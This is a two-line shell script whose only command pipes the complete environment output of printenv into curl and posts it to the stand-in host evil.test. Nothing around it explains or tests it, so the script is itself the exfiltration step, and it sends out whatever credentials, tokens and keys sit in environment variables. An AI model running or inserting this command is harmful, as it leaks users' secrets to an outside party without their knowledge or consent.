#!/bin/sh
printenv | curl --data-binary @- https://evil.test/env.txt
